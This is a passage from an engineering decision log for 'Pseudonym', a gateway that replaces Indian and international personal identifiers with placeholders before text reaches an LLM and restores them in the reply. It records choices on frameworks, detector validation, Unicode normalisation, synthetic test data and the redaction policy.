# Decisions

Short ADRs for each accepted design decision. Format: context, options, decision,
consequences.

**Provenance.** This record was kept outside the repository until
2026-10-03 and published on that date. The ADRs before ADR-036 were
written at the time of the decisions they record, several of them (ADR-035
among them) before the measurements they govern, but they entered git
history together on 2026-10-03, so **the repository history is not
evidence of when any of them was written**; their dates are the author's
own record. From ADR-036 onward, each ADR is committed before the
measurement it governs, so for those the history is the evidence.

The **project brief** mentioned below is the author's private working
document; the README states the design publicly. Where an entry mentions
the **session scratchpad**, it means a working folder outside the
repository used while the work was done; its probe scripts and logs are
not published.

---

<a id="adr-001"></a>

## ADR-001: HTTP framework — Fastify

**Context:** Pseudonym needs an HTTP server for the OpenAI-compatible endpoint, with
first-class support for streaming responses and strict control over what gets
logged (personal values must never appear in logs).

**Options considered:**

- **Fastify** — Node-only, mature plugin/hook system (`preValidation`, `onSend`),
  built on Pino.
- **Hono** — runtime-agnostic (Node/Bun/Deno/Workers), built on the web-standard
  `Request`/`Response`, smaller footprint.

**Decision:** Fastify.

**Consequences:**

- We get named lifecycle hooks that map directly onto our two hard
  requirements: `preValidation` to reject unsupported content types (tool
  calls, images, etc.) before doing any work, and `onSend` to run restoration
  on non-streamed responses before they leave the process.
- Logging correction (2026-09-27): Pino's `redact` option only hides known
  field _paths_; it cannot clean personal data out of free text. The actual
  rule is stricter than "use Pino redact" — **Pseudonym never logs request or
  response bodies at all**. Custom Pino serializers log only method, URL,
  status code and timing. Zod validation errors are formatted by us before
  logging/returning, so the received value is never included. Pino `redact` is
  an extra layer on top of this, not the mechanism itself.
- We gave up Hono's runtime portability (Bun/Deno/Cloudflare Workers). Not a
  loss for us — the deployment target is Docker on Node 22, not the edge.
- Any Fastify companion package (e.g. `fastify-type-provider-zod`) is a new
  dependency and needs separate sign-off before being added, same as any other
  dependency.

**Amendment (2026-09-29, Phase 3):** installed `fastify@5.12.5`, pinned
exactly (newest release, published 2026-09-16; brings `pino@10.3.1`). No
companion packages: Zod is called in the handler, tests use Fastify's
built-in `inject()`. Redaction and restoration run **in the route handler**,
not in the `preValidation`/`onSend` hooks sketched above: `onSend` only sees
the serialised payload string, the wrong place to restore, and one function
reading top to bottom (parse, redact, call, restore, build) is easier to
prove than logic split across hooks. Two Fastify defaults changed:
`text/plain` bodies are no longer parsed (Fastify parses them by default;
they now get a 415), and the error and not-found handlers are ours (never
`err.message`, never the URL). Checked on 5.12.5: Fastify already replaces
V8's JSON parse message (which quotes the input) with a generic one and
keeps no `cause`; the canary test pins that, since a future version could
change it.

---

<a id="adr-002"></a>

## ADR-002: Placeholder collisions — separate LITERAL namespace + loose-variant index reservation

**Context:** A user's own message text might already contain something that
looks like a Pseudonym placeholder (`[PERSON_1]`, or a loose form like `Person 1`).
Real detected values must never be confused with these, in either direction.

**Options considered:**

- Share one numbering pool between real detections and placeholder-shaped
  input, reserving slots so numbers are never reused.
- Give placeholder-shaped input its own separate namespace entirely, so real
  detections and "things that merely look like a placeholder" can never
  collide by construction.

**Decision:** Separate namespace, with two refinements settled 2026-09-27:

1. **Exact bracketed forms** (e.g. `[PERSON_1]`) found in the user's input are
   treated as an opaque value of pseudo-type `LITERAL` — mapped and restored
   byte-for-byte, using the same numbering pool as other `LITERAL` values, not
   the real `PERSON`/`EMAIL`/etc. pools.
2. **Recursion:** text that already looks like a `LITERAL` placeholder (e.g.
   the user literally typed `[LITERAL_1]`) is itself treated as a `LITERAL`
   value. The detection pass for "placeholder-shaped input" runs against its
   own output type, not just the real entity types.
3. **Loose (unbracketed) variants**, e.g. `Person 1` or `PERSON_1` typed as
   ordinary prose: these are _not_ replaced (replacing them would hide normal
   text from the model). But because restoration is tolerant of the model
   rewriting placeholders into exactly these loose forms, a real detected
   value of that type must **skip index N** if a loose variant of `TYPE_N`
   appears anywhere in the input. This guarantees that if the model's output
   later contains the bare string `Person 1`, it can only be the user's own
   text being echoed back (since no real value was ever assigned index 1),
   and restoration correctly leaves it alone. This reservation rule applies
   uniformly to every type tag, including `LITERAL` itself.

**Consequences:**

- Detection-time (literal/reservation scan), redaction-time (real numbering),
  and restoration-time (tolerant matching) all share one canonical definition
  of "what a `TYPE_N` variant looks like," implemented once and reused in all
  three places, so they cannot drift apart.
- The placeholder index is capped at 4 digits (`MAX_PLACEHOLDER_INDEX = 9999`),
  documented as a constant. This bounds both the loose-variant scan and the
  maximum lookahead the Phase 4 streaming buffer needs to hold.

**Amendment (accepted 2026-09-29, Phase 2, built in `src/redaction/`): a
reservation looks backward only, and only within the grammar restoration
actually accepts.** If a real value already holds the index a loose variant
names, the index is not renumbered (it would change a redacted prefix already
sent to the provider) — the existing entry is marked exact-only instead, so
only its bracketed form restores from then on. And since reservation and
restoration share one grammar (`src/redaction/variants.ts`), a loose variant
outside that grammar (`"Card 1"`, once the bare-space form was excluded for
every namespace but AADHAAR and LITERAL — see ADR-013) reserves nothing:
restoration was never going to mistake it for a placeholder either. Full
detail and the finalised grammar table are in ADR-013.

---

<a id="adr-003"></a>

## ADR-003: Overlap rule — what "validated" means per detector

**Context:** The overlap-resolution rule (validated beats unvalidated, then
longer span, then fixed type priority) requires a precise, per-detector
definition of "validated." Recorded here so `overlap.ts` (Phase 1) has one
place to point to.

**Decision:**

- **Aadhaar:** Verhoeff checksum passes **and** first digit is 2–9.
- **Card:** Luhn checksum passes **and** the number matches a known
  issuer-prefix/length combination (Visa, Mastercard, Amex, Discover, RuPay).
- **Phone:** `libphonenumber-js` reports the number as valid for some region
  (Indian or international).
- **PAN:** matches the fixed 5-letter+4-digit+1-letter shape **and** the 4th
  letter is a recognised entity-type code.
- **Email:** no checksum concept exists for email — always treated as
  unvalidated (pattern-only), so it never wins rule 1 of the overlap order and
  relies on span length / type priority when it overlaps something else.

**Type priority order** (lowest false-positive surface first):
Aadhaar > Card > PAN > IFSC > Phone > UPI > Email > IPv6 > IPv4 > generic API key/secret.
_Superseded by the amendments below; the order in force is the last one
(ADR-026: IP first, NUMBER last), and `DETECTION_TYPES` in
`src/detection/types.ts` holds it._

**Amendment (accepted 2026-09-28, Phase 1b): more card issuers.** The
"known issuer" list for cards now also has **Diners Club, JCB and UnionPay**,
because the published test cards include them and they are common. RuPay also
gets its co-branded JCB ranges (353, 356). Ranges genuinely overlap (RuPay and
Discover share 65; RuPay and JCB share 353/356), so `issuersOf` returns every
match. **Maestro stays out:** its prefixes (50, 56–69) cover nearly every number
starting with 5 or 6, so including it would make the prefix check meaningless.
The detector's table (`src/detection/card.ts`) is written independently of the
generator's, from the same source, per ADR-008.

**Concern raised, rule not changed (2026-09-28).** Rule 1 lets a validated
match beat a longer unvalidated one that contains it. Every email is
unvalidated, so a phone number inside an email address
(`rahul.<mobile>@example.com`) would win and leave `rahul.` and the domain
unredacted. Phase 1b avoids this at the detector level: digits glued to `@`
belong to the email, not to a phone, Aadhaar or card. The general question
("should a containing span ever win?") comes back in Phase 5 with UPI IDs,
which are often `<mobile>@bank`.

**Amendment (2026-09-28, ADR-011):** `NUMBER`, the safety net for long
numbers no detector claimed, is last in the priority order, below every
real type. It only ever takes digits nothing else claimed.

**Amendment (2026-09-30, Phase 5b, ADR-022):** `SECRET` joins the order
just above `NUMBER`: `… > EMAIL > SECRET > NUMBER`. "Validated" for a
secret means a known key format (prefix, alphabet, minimum length); a
secret found by its keyword (`password: …`) is unvalidated and carries its
own `context: true`, because the keyword is part of its pattern. A
detector may now set `context` on a candidate; `detect()` looks for a
nearby keyword only when it did not.

**Amendment (2026-10-01, Phase 5b, ADR-024):** `UPI` takes its listed
place: `… > PHONE > UPI > EMAIL > …`. "Validated" for a UPI ID means its
handle is on the detector's list of known handles. The containing-span
concern above does not arise for `<mobile>@<handle>` (the digit detectors
refuse digits glued to `@`, so there is no phone inside the ID); it
remains open for `<mobile>.<name>@<unknown handle>` and for
keyword-assigned secrets (5c).

**Amendment (2026-10-01, Phase 5b, ADR-025):** `IFSC` takes its listed
place: `… > PAN > IFSC > PHONE > …`. "Validated" for an IFSC means its
first four letters are a bank code on the detector's list (260 codes from
RBI's list of NEFT-enabled branches). **The Phase 1b answer to the
concern above ("digits glued to `@` belong to the email") now applies to
every detector made of letters and digits:** PAN never had it, and a
PAN-shaped email local part won over the email and sent the domain
(bug-log 27, fixed); IFSC has it from the start. The rest of the concern
is unchanged and still open for 5c: a validated value followed by a dot
and more before the `@` (`<PAN>.x@…`, `<IFSC>.x@…`,
`<mobile>.x@…`) wins and leaves the rest of the address visible.

**Amendment (2026-10-01, Phase 5b, ADR-026):** one `IP` type for IPv4
and IPv6 replaces `IPv6 > IPv4` (ADR-021 item 7), and it goes **first**:
`IP > AADHAAR > CARD > PAN > IFSC > PHONE > UPI > EMAIL > SECRET >
NUMBER`. Measured: in its listed place (after EMAIL), 30 of 153 generated
IPv4 addresses were typed PHONE, a tie on exactly the same span (a Pune
landline to libphonenumber), and 9.8% of 12-digit dotted quads starting
with 2 pass the Aadhaar checks. Only AADHAAR, PHONE and SECRET can cover
exactly an address's text, and the address is the likelier reading of
all three. "Validated" for IP means an IPv4 address not right after a
version word, or an IPv6 address with a group of 3–4 hex digits or an
IPv4 part. The containing-span concern shows up twice more (5c):
`api_key=<address>-x7` keeps only the address, and an address with a
prefix length whose digits read as a longer valid phone is typed PHONE.

**Amendment (2026-10-02, Phase 5c item 5, ADR-031):** the keyword-only
types go between IFSC and PHONE: `IP > AADHAAR > CARD > PAN > IFSC >
VOTER > PASSPORT > DOB > PHONE > UPI > EMAIL > SECRET > NUMBER`. None of
them is ever validated. Their shapes cannot share a span with each other
or with PAN or IFSC (the glue rules keep them apart); the one tie that
happens is DOB and PHONE on a dashed or dotted date (`07-03-1991` is a
possible phone number), and a real calendar date beside a birth word is
the likelier reading.

---

<a id="adr-004"></a>

## ADR-004: Phone detection — `libphonenumber-js`

**Context:** Hand-rolling international phone number validation (country
codes, national formats) is large and error-prone.

**Decision:** Approved 2026-09-27. Use the `libphonenumber-js/max` metadata
bundle (full accuracy), not the `/min` bundle, per explicit instruction to
prioritise validation accuracy over bundle size. Bundle-size cost to be
measured and reported when it's actually wired into the Phase 1 phone
detector (installing it in Phase 0 with nothing using it yet would be
premature).

**Rejected alternatives:** `google-libphonenumber` (heavier, Closure-compiled,
awkward ESM interop), `awesome-phonenumber` (smaller API, less common in the
ecosystem).

**Installed 2026-09-28 (Phase 1b): `libphonenumber-js` `~1.13.14`.**

_Version range._ Pinned with a tilde (patch updates only), not exactly like the
other dependencies. Its patch releases mostly update the phone-number metadata
(new ranges, changed lengths), so an exact pin would make validation slowly go
stale. `package-lock.json` still makes installs reproducible, and a patch
update is a deliberate `npm update` that shows up in review.

> **Superseded (2026-10-03):** now pinned exactly, `"1.13.14"`, because
> two mutation judgements and every published PHONE number rest on this
> version's metadata. Reasoning and the bump procedure: ADR-036, under
> "The runtime is pinned exactly" ([ADR-036](#adr-036)).

_Measured cost (2026-09-28, Node 22.17.1, this dev machine)._ Pseudonym is a
Node server, not a browser bundle, so the numbers that matter are what
`import 'libphonenumber-js/max'` actually loads, plus time and memory:

| Measure                                | Value                                                    |
| -------------------------------------- | -------------------------------------------------------- |
| Modules loaded by the import           | 93                                                       |
| Bytes loaded                           | 512 KB raw (177 KB of it metadata), 160 KB gzip          |
| Import time                            | 66–79 ms (3 runs), once at start-up                      |
| First search                           | 5–12 ms (builds metadata objects)                        |
| Heap growth after import and first use | +2.5 MB                                                  |
| Runtime dependencies it brings         | 0                                                        |
| On disk                                | 12 MB (mostly alternative builds we never load)          |
| Metadata sets, raw / gzip              | min 84 / 20 KB · mobile 99 / 24 KB · **max 157 / 40 KB** |

`/max` costs about 20 KB gzip more than `/min`, and in return gives full
`isValid` accuracy and number types. That is cheap for a server.

_Speed in the pipeline._ On 100 KB of mixed text, `detect()` takes about
210 ms. About 73 ms is normalisation, and about 120 ms is libphonenumber's two
searches (VALID ≈ 66 ms, POSSIBLE ≈ 54 ms; see ADR-010). Added to the Phase 3
speed question.

_Behaviour worth knowing._

- Ofcom's drama range (+44 7700 900xxx) is **not valid** to libphonenumber, on
  purpose. Our UK generator uses that range, so those numbers are only ever
  unvalidated phones. Fictional numbers that it does accept as valid: NANP
  555-0100 to 555-0199, UK 020 7946 0xxx, Australian 0491 570 xxx. The tests
  use those.
- Without a `+`, numbers are read as Indian (`defaultCountry: 'IN'`), so a
  bare 10-digit number starting 6–9 is a valid Indian mobile.
- Its POSSIBLE search does not check the characters around a number, so the
  phone detector adds its own check.

**Amendment (2026-09-28, bug-log 7): extensions are not recognised, and a
match is never dropped for cutting into digits.** libphonenumber reads `,`
`;` `#` `~` `x` `ext` (and more) after a number as an extension, which
made a list like `<a>, <b>` one match ending inside `<b>`, and the boundary
check then dropped it: neither number was redacted. Options: split the text
at list separators and search each piece (changes offsets, more code);
parse extensions and search again after them (libphonenumber does not report
where an extension starts); or hide extension markers from libphonenumber.
_Decision:_ libphonenumber searches a copy of the text in which every marker
from its own extension grammar is replaced by newlines of the same length,
so offsets are unchanged; and a match glued to a digit is kept and widened
by `detect()` instead of dropped. _Consequences:_ extensions are not found
(the number before them is, and an extension is not personal data); the
digits of a phone number written with a comma inside it (`98765,43210`)
are not found as one phone. Speed is unchanged.

---

<a id="adr-005"></a>

## ADR-005: TypeScript version pin — `~6.0.3`

**Context:** TypeScript 7 has been released (the Go-ported native compiler) and
is what `npm install typescript` resolves to. The lint toolchain is not ready
for it: `typescript-eslint@8.70.1` declares
`peer typescript@">=4.8.4 <6.1.0"`, so installing TypeScript 7 alongside it
fails `npm`'s dependency resolution outright (`ERESOLVE`) rather than merely
warning. Forcing it through with `--force` or `--legacy-peer-deps` would leave
the type-aware lint rules running against a compiler API they don't support.

**Options considered:**

- TypeScript 7.x with `--force` / `--legacy-peer-deps` — newest compiler, but a
  knowingly broken peer contract and no type-aware linting guarantee.
- TypeScript 5.x — safely inside the peer range, but not the newest compatible
  version, so it leaves a whole major behind for no reason.
- **TypeScript 6.0.x** — the newest line that satisfies `<6.1.0`, so it is the
  newest version the lint toolchain actually supports.

**Decision:** Pin `typescript` to `~6.0.3` (newest 6.0.x; the `~` allows 6.0.x
patch updates but never 6.1+, which would break the `typescript-eslint` peer
range). Kept in `devDependencies`, not `dependencies` — it is a build tool, so
a production `npm ci --omit=dev` should not install a compiler.

**Correction (2026-09-27):** the Phase 0 write-up said this pin landed on "the
latest TypeScript 5.x line." That was wrong and unverified. The install command
used was `npm install "typescript@<6.1.0"`, which npm resolved to **6.0.3** all
along. The version was always 6.0.x; only the report was inaccurate. Recorded
here because "state what you verified, not what you assumed" is the lesson, and
the pin itself never changed.

**When to revisit:** when `typescript-eslint` ships a release whose peer range
admits TypeScript 7 (watch its release notes / peer range). At that point bump
both together in one change, re-run the full check suite, and update this ADR
rather than adding a new one.

---

<a id="adr-006"></a>

## ADR-006: Project renamed from "Veil" to "Pseudonym"

**Context:** The project was originally called "Veil". Two problems with that
name:

- **Accuracy.** "Veil" suggests hiding or obscuring, but what the gateway
  actually does is _reversible_ replacement: real values go out as
  placeholders and come back restored. The precise term for reversible
  replacement of identifying data is **pseudonymisation** — the word used by
  GDPR (Art. 4(5)) and India's DPDP framing. Anonymisation, by contrast, is
  irreversible, and calling this "veiling" or "anonymising" would overstate
  what the system does — the same reason the promise is worded as narrowly as
  it is.
- **Searchability.** "Veil" is a common English word and an existing product
  name in several spaces, so it is ambiguous and hard to search for — a real
  cost for a portfolio project meant to be found and talked about.

**Options considered:**

- Keep "Veil" — no churn, but inaccurate and hard to find.
- "Anonymiser"-style name — actively wrong: the process here is reversible.
- **"Pseudonym"**, package/repo `pseudonym-gateway` — accurate, technically
  precise, and searchable.

**Decision:** Renamed 2026-09-28. Display name **Pseudonym**, package and repo
name **pseudonym-gateway**. Tagline: "An OpenAI-compatible privacy gateway that
pseudonymises personal data before it reaches an LLM and restores it in the
reply."

**Consequences:**

- `package.json` is `pseudonym-gateway` and keeps `"private": true`, so it can
  never be published to npm by accident.
- **Terminology guard:** `[PERSON_1]` and friends are still called
  **placeholders** everywhere — in code, tests, comments and docs — never
  "pseudonyms". The project is named after the technique; the tokens are not.
  Mixing the two would make design discussions ambiguous ("is a pseudonym the
  token or the system?"). The placeholder format is unchanged.
- Project-specific environment variables use the `PSEUDONYM_` prefix. As of
  Phase 0 there are none: `NODE_ENV`, `PORT` and `LOG_LEVEL` are
  platform/ecosystem conventions and are deliberately _not_ prefixed, since
  hosts inject `PORT` and tooling reads `NODE_ENV` by those exact names.
  The prefix applies from Phase 3 onward, when provider and gateway settings
  appear.
- The repository directory on disk was renamed to
  `E:\professional\Projects\pseudonym-gateway` on 2026-09-28, finishing the
  rename. Purely a local move: no code, config, script or test referenced the
  old directory name, so nothing had to change alongside it, and no git remote
  is configured yet to be affected.

---

<a id="adr-007"></a>

## ADR-007: Normalisation — which characters are invisible, and how NFKC keeps an offset map

**Context:** Detectors run on normalised text, but replacement happens in the
original text (the project brief, "Normalisation with an offset map"). The brief listed
five invisible characters to remove (U+200B–U+200D, U+2060, U+FEFF). Text
pasted from documents and chat apps also carries soft hyphens (U+00AD) and
bidi controls (U+200E/F, U+202A–E, U+2066–9), especially mixed Hindi/English
text. Any of them can split an Aadhaar exactly as a zero-width space does.

**Options considered (invisibles):**

- The five from the brief only: a soft hyphen or bidi mark inside a number
  hides it from detection.
- The five plus a hand-picked list: explicit, but a list we must maintain.
- **Unicode's `Default_Ignorable_Code_Point` property:** the standard's own
  definition of "invisible, ignore when not supported". It covers the five,
  plus soft hyphen, bidi controls, variation selectors and tag characters
  (which are used for "ASCII smuggling"). It is one regex:
  `\p{Default_Ignorable_Code_Point}`.

**Decision (accepted 2026-09-28):** Remove every `Default_Ignorable_Code_Point`
character before detection.

**How NFKC and the offset map fit together** (implementation of the settled
design; recorded here so it can be explained):

1. Remove invisibles, recording where each kept code unit came from.
2. Split the rest into grapheme clusters (`Intl.Segmenter`).
3. NFKC each cluster; if normalising a cluster together with the previous
   group differs from normalising them apart, merge them (Hangul compatibility
   jamo need this; see bug-log entry 1). Then map every remaining decimal
   digit (`\p{Nd}`) to ASCII (see the amendment below).
4. Every output code unit stores its group's source range `[start, end)` in
   the original. `toOriginal(span)` returns the start of the first unit's range
   and the end of the last unit's range.

Whole-string NFKC was rejected because it gives no offset map. Per-code-point
NFKC was rejected because it cannot compose "e" + combining acute into "é", so
the same name would normalise two different ways.

**Consequences:**

- `normalise(s).text` equals whole-string NFKC of the visible text (with
  every decimal digit as ASCII). This is tested against that simple oracle.
- `toOriginal` rounds _outwards_ to whole clusters. It never splits a letter
  from its accent, and a span covers any invisible characters between its
  first and last characters. That is how a zero-width-split value gets
  replaced completely. Invisibles just before or after a value stay outside the
  span, which is harmless.
- Removing tag characters and variation selectors only changes the
  _detection_ copy. What is sent is the original text with detected spans
  replaced, so emoji are unaffected.
- **Measured cost (2026-09-28, Node 22.17.1, this dev machine):** about
  100–130 ms per 100 KB of text. Most of it is `Intl.Segmenter` (about 73 ms
  per 100 KB on its own). Because Pseudonym re-normalises the whole history on
  every request, this grows with conversation length and blocks the event
  loop. Accepted for now (rule 7). Revisit in Phase 3 with real request sizes.
  The candidate optimisation is to segment only the non-ASCII runs plus one
  neighbouring character on each side.
- Grapheme and NFKC data come from the ICU bundled with Node (ICU 77.1,
  Unicode 16.0 on Node 22.17.1). Output is deterministic within one process,
  which is all the per-request mapping needs. It may differ slightly between
  Node versions.
- ~~Only Devanagari digits are mapped, per the brief.~~ Superseded by the
  amendment below.

**Amendment (accepted 2026-09-28): map every Unicode decimal digit, not just
Devanagari.**

_Context._ The brief mapped Devanagari ०–९ only. Bengali, Gurmukhi, Gujarati,
Odia, Tamil, Telugu, Kannada and Malayalam each have their own digits, and so
do Urdu (Extended Arabic-Indic) and dozens of other scripts. NFKC does not
touch any of them, so an Aadhaar typed in Bengali digits went straight past
every detector. The special case was also a hand-written table with a single
entry, the kind of list that quietly falls behind.

_Options considered._

- Keep Devanagari only and revisit in Phase 5: leaves a known hole open.
- Hand-list the nine Indian-script blocks: fixes the obvious cases, but it is
  still a list someone has to maintain and could get wrong.
- **Map every `\p{Nd}` character (Unicode's "decimal digit" category).**
  Unicode's Stability Policy guarantees that decimal digits are assigned in
  contiguous runs of 0–9 in ascending order, so a digit's value is its code
  point minus the code point of its block's zero.
- Compute the zero at run time by walking back through `\p{Nd}`: no table,
  but slower per digit, and behaviour changes silently when Node's Unicode
  data does.

_Decision._ Map every `\p{Nd}` digit to ASCII, driven by a **generated table**
of block zeros:

- `scripts/generate-decimal-digit-zeros.ts` (`npm run gen:digits`) walks
  every code point once and writes `src/detection/decimal-digit-zeros.ts`:
  76 zeros for Unicode 16.0 (Node 22.17.1, ICU 77.1), 760 digits in all. A new
  block starts every ten code points, because one run can hold several blocks
  back to back (the five sets of mathematical digits at U+1D7CE–U+1D7FF).
- `normalise` builds its digit regex from that same table (minus ASCII) and
  finds a digit's zero by binary search. Every character the regex matches
  therefore has a zero, so there is no "not found" path.
- `test/unit/detection/decimal-digit-zeros.test.ts` checks the table against
  the running Node's `\p{Nd}`, using a separate derivation in
  `test/support/decimal-digits.ts` (find the run start by walking back;
  value = offset mod 10): blocks ascending and non-overlapping, each block ten
  decimal digits, each zero aligned to its run, and 10 × blocks = the total
  number of decimal digits. The normalise oracle uses the same independent
  derivation, and its property alphabet includes all 760 digits.

_Consequences._

- An Aadhaar, card or phone number written in any script's digits is seen as
  ASCII by the detectors. Mixed-script numbers (Bengali and ASCII digits in
  one value) are caught too, since each digit is mapped on its own.
- **Unicode-version drift is loud, not silent.** If a future Node adds digit
  blocks, the table test fails with "run `npm run gen:digits`". Until then,
  the new digits are simply not mapped (never mapped wrongly).
- Numeric characters that are not decimal digits are left alone: Tamil ௰
  (ten, category No), Roman numerals (NFKC spells them as letters), CJK
  numerals. Nobody writes an ID digit by digit in those.
- Mapping more digits could raise false positives in non-Latin text (a
  Bengali invoice number now looks like digits). Phase 5 measures this.
- **Measured cost:** none that stands out from noise. On 100 KB of mixed
  English/Hindi/Bengali text, medians were 106–119 ms before and 116–120 ms
  after, each version in its own process (same machine, Node 22.17.1).
- Mutation checks: dropping the Tamil block from the table fails 4 tests
  (including the table-coverage test); an off-by-one in the binary search
  fails the oracle, the hidden-value property and every per-script example.

**Amendment (2026-10-02, bug-log 44): one table, every allowed Node.**

_Context._ The table was generated on Node 22.17.1 (Unicode 16.0). The
`.nvmrc` Node, 22.23.3, has Unicode 17.0, which added the Tolong Siki
digits (U+11DE0–U+11DE9), so on it those digits went unmapped, and the
exact-match test failed. `engines` (`>=22.20.0`) allows Nodes on either
side of that change (Node 22.22.1 moved to ICU 78), and later majors will
add more. An exact match against whatever Node runs can pass on one
Unicode version only, and regenerating on an older Node would drop blocks.

_Options considered._ (a) Keep the exact match and pin `engines` to one
Unicode version: blocks newer majors for no gain. (b) Build the table at
start-up from `p{Nd}`: about 0.1 s per process, behaviour changes
silently with the runtime, and an older Node would still miss newer
digits. (c) **Generate on the `.nvmrc` Node and judge other Nodes by
direction:** a newer table on an older Node maps code points that Node
has not assigned (harmless, fails closed); an older table on a newer Node
misses digits (fails open), so that fails the tests.

_Decision._ (c). The table exports `DECIMAL_DIGIT_UNICODE`. Tests on every
Node: each block is ten digits this Node knows or ten code points it has
not assigned (`p{Cn}`), and every digit this Node knows is covered. On a
Node with the table's Unicode: an exact match. On the `.nvmrc` Node (CI):
the table's Unicode equals that Node's. `npm run gen:digits` refuses to
run on a Node whose Unicode is older than the table's.

_Consequences._ Regenerate after changing `.nvmrc`, or when a newer Node
reports digits the table lacks. On Node 22.17.1 the two exact checks are
skipped and the rest pass. 77 blocks, 770 digits.

---

<a id="adr-008"></a>

## ADR-008: Synthetic data generators — own seeded PRNG, in `src/synthetic/`

**Context:** Synthetic values (Aadhaar, card, PAN, email, phone) are needed by
property tests now, detector tests in Phase 1b, the seeded evaluation dataset
in Phase 5 and the demo page in Phase 7.

**Options considered:**

- **Own seeded PRNG plus plain functions** (`aadhaar(rng)`), wrapped for
  fast-check as `fc.integer().map(seed => …)` when needed.
- fast-check arbitraries only, with `fc.sample(arb, { seed })` for datasets.
  This is one implementation and includes shrinking, but dataset
  reproducibility would depend on fast-check's internals and version, and a
  devDependency would become part of the evaluation pipeline.
- Own PRNG, but kept under `test/support/` so it can never reach a production
  build.

**Decision (accepted 2026-09-28):** Own PRNG: splitmix32 (about 15 lines, as
published at <https://github.com/bryc/code/blob/master/jshash/PRNGs.md>)
behind a small `Rng` interface (`int`, `pick`, `digits`, `chance`).
Generators live in `src/synthetic/` so they are linted, type-checked and
covered. The gateway never imports them.

**Consequences:**

- A seed alone reproduces a dataset, whatever fast-check version is installed.
- `Rng.int` uses rejection sampling, because `x % range` favours small values
  whenever 2^32 isn't a multiple of the range. A test proves it: plain modulo
  fails it with about 50% of values where a third belong.
- Shrinking is lost for generated values. That matters little, because
  counterexamples are hidden anyway (ADR-009); a seed and path replay them.
- Only the types Phase 1b needs are generated (Aadhaar, card, PAN, email,
  Indian mobile, UK drama-range mobile). IFSC, UPI, IP, secrets and names
  arrive with their detectors (rule 12).
- The card-prefix table in the generator and the one in the Phase 1b detector
  should be written independently from the same source (Wikipedia's IIN
  table). Otherwise a shared mistake would pass both. This is the lesson of
  bug-log entry 2.

---

<a id="adr-009"></a>

## ADR-009: Every generated personal-looking value is in-memory only

**Context:** Rule 4 kept randomly generated _card_ numbers out of files and
printed output, because one could coincide with a real card. The same risk
applies elsewhere. By a rough back-of-envelope estimate, a random
Verhoeff-valid Aadhaar has about a 1-in-60 chance of being a real, issued
number (about 1.4 billion issued out of about 80 billion valid). A random
Indian mobile number has about a 1-in-4 chance of belonging to a real
subscriber, and India has no reserved fictional range. PAN has a smaller but
non-zero chance.

**Decision (accepted 2026-09-28):** Extend rule 4 to every generated
personal-looking value (Aadhaar, card, PAN, phone). Such values:

- exist only in memory during a test run;
- are never written to files, fixtures or snapshots;
- are never printed, including in test failure output.

Fixture _files_ still contain only published test numbers (for example the
Stripe, Braintree and Razorpay card lists in
`test/fixtures/published-test-cards.ts`).

**How it is enforced:**

- `test/support/quiet-property.ts` (`assertPropertyQuietly`) runs a fast-check
  property with `fc.check` and, on failure, throws a message with only the run
  count, seed and path, never the counterexample or the predicate's own error.
  Its own test plants a card number and checks it doesn't appear in the
  message.
- Predicates return booleans instead of calling `expect`, whose failure
  messages would print both values.
- All property tests in the repo use the wrapper, so nobody has to decide
  case by case whether an input is personal-looking.

**Consequences:**

- Debugging a failure means replaying `fc.check(property, { seed, path })` and
  inspecting `counterexample` in a debugger, or printing only structural facts
  (length, position, digit pair), never the value. Bug-log entry 2 was
  diagnosed this way.
- Phase 1b detector tests generate Aadhaar and phone values at run time from a
  seed instead of hard-coding them. The Phase 5 held-out adversarial set is
  hand-written and lives in files, so it will need a policy of its own (for
  example Aadhaar-shaped values that fail Verhoeff, or synthetic values
  checked against a reserved range). That will be decided when Phase 5 starts.
  _Decided 2026-09-30 (ADR-021):_ the file holds slots, not values; values
  are generated in memory when the set is rendered, and a lint rejects
  anything typed that looks like one.
- Emails use reserved domains (RFC 2606/6761) and UK numbers use Ofcom's drama
  range, so those can never be real. They still follow the same in-memory rule
  for simplicity.

---

<a id="adr-010"></a>

## ADR-010: Context policy — validated always, unvalidated only with a keyword

**Context:** The brief asks for context keywords ("aadhaar", "card", "UID"…)
to score borderline matches, because Luhn and Verhoeff each accept about 1 in
10 random numbers. Someone has to decide what "borderline" means and what
happens to it. There is no evaluation data yet (Phase 5), so any weights would
be invented.

**Options considered:**

- **Always redact validated matches.** Context changes the outcome only for
  _unvalidated_ candidates: the right shape, but failing the checks (a typo in
  the check digit, an unknown card issuer, a PAN with a wrong 4th letter, a
  phone number that is possible but not valid). Those are redacted only with a
  keyword nearby. Every detection records whether context was found.
- **Require context or grouping.** A validated number written as one bare run
  with no keyword is not redacted. Far fewer false positives, but an Aadhaar
  pasted bare, with no keyword, is sent to the provider.
- **Weighted score and threshold.** Rejected for now: nothing to tune it on.

**Decision (accepted 2026-09-28):** the first option. A false positive costs
little, because the value is restored in the reply. A miss leaks. So the
policy leans to recall.

The rule, per candidate:

| Candidate                              | Accepted when                                               |
| -------------------------------------- | ----------------------------------------------------------- |
| Validated (ADR-003 checks pass)        | always                                                      |
| Unvalidated (right shape, checks fail) | a keyword for its type within 40 characters before or after |
| Email (pattern only, never validated)  | always: the pattern is specific enough on its own           |

Shapes: Aadhaar = 12 digits; card = 13–19 digits; PAN = 5 letters, 4 digits,
1 letter (any case); phone = what libphonenumber's POSSIBLE search finds.

Keywords are matched in the normalised text, case-insensitively, as whole
words (`card` matches `Card:` and `card-holder`, not `discard`), in
English and Hindi (आधार, कार्ड, पैन, फ़ोन, मोबाइल). Email has none. The list is
in `src/detection/context.ts`. "a/c" from the brief belongs to bank account
numbers, which are not a detector yet.

**Detector boundaries** (decided alongside, same reasoning): a number or PAN
glued to a letter, digit, combining mark or underscore is part of a longer
token (a hash, an identifier, an API key) and is not detected. Glued to `@` it
belongs to an email address. After a `+` it is a phone number, not an Aadhaar
or card. Numbers may use 1–3 separators (space, dot, hyphen, dashes) between
groups. When a number is only part of a longer run of groups, it must use its
type's usual grouping (Aadhaar 4-4-4; card 4-4-4-4, 4-6-5, 4-6-4, 4-4-4-4-3) or
be a single unbroken group.

**Consequences:**

- **Measured false-positive rates on random numbers** (5,000 each, seed 1,
  "Reference N noted.", no keyword; `detect.test.ts` asserts these stay in
  range):
  - random bare 12-digit number → Aadhaar: **8.62%** (theory: 0.8 × 0.1 = 8%)
  - random bare 16-digit number → card: **3.24%**
  - random 10-digit number starting 6–9 → phone: **100%** (they are all valid
    Indian mobiles); any random 10-digit number: **63.70%**
  - a random 12-digit number next to "aadhaar" → Aadhaar: 99.36% (the rest
